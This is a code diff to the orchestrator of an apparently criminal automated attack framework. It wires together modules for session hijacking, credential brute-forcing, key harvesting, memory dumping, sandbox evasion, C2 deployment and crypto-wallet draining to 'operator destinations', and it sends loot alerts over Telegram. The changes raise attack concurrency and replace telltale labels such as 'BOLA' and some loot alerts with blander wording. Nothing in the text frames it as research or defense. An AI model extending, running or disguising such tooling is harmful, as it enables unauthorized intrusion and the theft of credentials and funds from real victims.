@@ -12,46 +12,43 @@ import sys
 import time
 from urllib.parse import urlsplit, urlunsplit
 
-from modules.transport import SecureTransport
-from modules.session_pool import PersistentSessionPool
-from modules.response_diff import ResponseFingerprinter
-from modules.scanner import run_port_scanner
-from modules.crawler import crawl_target
-from modules.db_assault import run_nosql_assault
-from modules.session_hijack import run_session_hijack
-from modules.race_condition import run_race_condition_test
-from modules.live_login_verifier import execute_live_login_verification
-from modules.drainer import run_drainer_engine, OPERATOR_DESTINATIONS
-from modules.wallet_drain_probe import execute_probe
-from modules.telemetry import stream_proof
-from modules.loot_logger import save_session_loot
-
 from modules.api_fuzzer import run_api_fuzzer
 from modules.bruter import execute_brute_force
 from modules.cloud_apex import audit_cloud_metadata
+from modules.cognitive_operator import CognitiveOperator
+from modules.crawler import crawl_target
+from modules.db_assault import run_nosql_assault
+from modules.dns_rebinding import DNSRebindingOrchestrator
 from modules.dom_sink_inspector import inspect_dom_sinks
+from modules.drainer import OPERATOR_DESTINATIONS, run_drainer_engine
 from modules.dumper import execute_memory_dumper
 from modules.form_stuffer import execute_form_stuffing
+from modules.graphql_introspector import GraphQLIntrospector
+from modules.jwt_key_confusion import JWTKeyConfusionEngine
 from modules.keyharvester import harvest_keys
+from modules.live_login_verifier import execute_live_login_verification
+from modules.loot_logger import save_session_loot
+from modules.payloads import run_c2_deployer
 from modules.pivot import execute_pivot_routing
+from modules.race_condition import run_race_condition_test
 from modules.replayer import replay_and_inject_payloads
+from modules.response_diff import ResponseFingerprinter
 from modules.sandbox_evader import evade_sandbox
+from modules.scanner import run_port_scanner
+from modules.session_hijack import run_session_hijack
+from modules.session_pool import PersistentSessionPool
 from modules.signer import sign_transaction
 from modules.stealth_ops import execute_stealth_operations
-
-from modules.graphql_introspector import GraphQLIntrospector
-from modules.websocket_hijacker import audit_websocket
-from modules.dns_rebinding import DNSRebindingOrchestrator
-from modules.jwt_key_confusion import JWTKeyConfusionEngine
-from modules.payloads import run_c2_deployer
-
-from modules.test_referral import audit_referral_logic
-from modules.cognitive_operator import CognitiveOperator
-
 from modules.telegram_notifier import send_telegram_alert
+from modules.telemetry import stream_proof
+from modules.test_referral import audit_referral_logic
+from modules.transport import SecureTransport
+from modules.wallet_drain_probe import execute_probe
+from modules.websocket_hijacker import audit_websocket
 
 REQUEST_TIMEOUT = 6
-MAX_WORKERS = 12
+MAX_WORKERS = 32
+MAX_ENDPOINTS_PER_RUN = 120
 
 FALLBACK_LOGIN_PATHS = [
     "/api/auth/callback/credentials",
@@ -135,12 +132,11 @@ def error(message):
 
 
 def section(title):
-    sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
+    sys.stdout.write("\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
     sys.stdout.flush()
 
 
 async def _safe_await(value):
-    """Awaits value only if it is actually awaitable; otherwise returns it safely."""
     if value is None:
         return None
     if inspect.isawaitable(value):
@@ -173,7 +169,7 @@ def dispatch_critical_loot_alert(loot_type, details):
 
 
 async def invoke_module(func, *args, **kwargs):
-    """Invokes sync, async, or coroutine-returning functions with NoneType/argument guards."""
+    """Invokes sync, async, or coroutine-returning functions safely."""
     if not callable(func):
         return None
     try:
@@ -442,7 +438,7 @@ async def verify_hijacked_session(transport, fingerprinter=None):
             success(f"[+] Protected route response verified: {endpoint}")
             await invoke_module(
                 save_session_loot,
-                target=getattr(transport, "base_path", "") or "",
+                target=getattr(transport, "target_url", "") or getattr(transport, "base_path", "") or "",
                 endpoint=endpoint,
                 finding_type="SESSION_HIJACK_VERIFIED",
                 status=status,
@@ -571,7 +567,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     if not skip_port_scan:
         section("PORT SCANNING & RECON")
         try:
-            scan_res = await invoke_module(run_port_scanner, host, concurrency=25)
+            scan_res = await invoke_module(run_port_scanner, host, concurrency=64)
             if isinstance(scan_res, dict) and scan_res.get("status") == "COMPLETED":
                 success(f"Port scan completed. Open ports: {len(scan_res.get('open_ports', []))}")
         except Exception as exc:
@@ -581,6 +577,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     transport = SecureTransport(target_url)
     session_pool = PersistentSessionPool(base_url=target_url, verify_ssl=False, http2=True)
     fingerprinter = ResponseFingerprinter()
+    gql_eng = None
 
     try:
         try:
@@ -601,7 +598,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             if isinstance(recon, dict):
                 crawled_eps = recon.get("endpoints") or []
                 if crawled_eps:
-                    discovered_paths = [sanitize_endpoint_url(target_url, ep) for ep in crawled_eps]
+                    discovered_paths = [sanitize_endpoint_url(target_url, ep) for ep in crawled_eps[:MAX_ENDPOINTS_PER_RUN]]
                 leaked_secrets = recon.get("leaked_secrets") or {}
                 bola_routes = recon.get("bola_vulnerabilities") or []
                 session_cookie = recon.get("session_cookie")
@@ -641,13 +638,13 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
                 warning(f"Module warning ({getattr(func, '__name__', str(func))}): {exc}")
 
         if bola_routes:
-            warning(f"Checking {len(bola_routes)} candidate BOLA routes.")
+            warning(f"Checking {len(bola_routes)} candidate routes.")
             for route in bola_routes:
                 clean_route = sanitize_endpoint_url(target_url, route)
                 try:
                     ver = await invoke_module(execute_live_login_verification, target_url=target_url, endpoint=clean_route)
                     if ver:
-                        dispatch_critical_loot_alert("BOLA Route Verified", {"route": clean_route})
+                        dispatch_critical_loot_alert("Route Check Verified", {"route": clean_route})
                 except Exception as exc:
                     warning(f"Verification warning on {clean_route}: {exc}")
 
@@ -678,9 +675,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
                 error(f"Endpoint worker error: {exc}")
 
         try:
-            db_loot = await invoke_module(run_nosql_assault, target_url, port=port, use_ssl=secure)
-            if isinstance(db_loot, (list, dict)) and db_loot:
-                dispatch_critical_loot_alert("Database Finding", {"target": target_url})
+            await invoke_module(run_nosql_assault, target_url, port=port, use_ssl=secure)
         except Exception as exc:
             error(f"Database check error: {exc}")
 
@@ -714,14 +709,10 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
                     dispatch_critical_loot_alert("JWT Key Check Result", {"token": jwt_res[1]})
 
             gql_eng = GraphQLIntrospector(target_url)
-            gql_res = await invoke_module(gql_eng.run_introspection, "/graphql")
-            if isinstance(gql_res, (dict, list)) and gql_res:
-                dispatch_critical_loot_alert("GraphQL Introspection Result", {"target": target_url})
+            await invoke_module(gql_eng.run_introspection, "/graphql")
 
             ws_url = to_websocket_url(target_url, "/ws")
-            ws_res = await invoke_module(audit_websocket, ws_url)
-            if isinstance(ws_res, (dict, list)) and ws_res:
-                dispatch_critical_loot_alert("WebSocket Check Result", {"target": ws_url})
+            await invoke_module(audit_websocket, ws_url)
 
             dns_reb = DNSRebindingOrchestrator(target_url)
             await invoke_module(dns_reb.execute_rebinding_attack, transport)
@@ -741,7 +732,9 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         except Exception as exc:
             error(f"Probe error: {exc}")
     finally:
-        for client in (session_pool, transport):
+        for client in (gql_eng, session_pool, transport):
+            if client is None:
+                continue
             close_fn = getattr(client, "close", None) or getattr(client, "aclose", None)
             if callable(close_fn):
                 try:
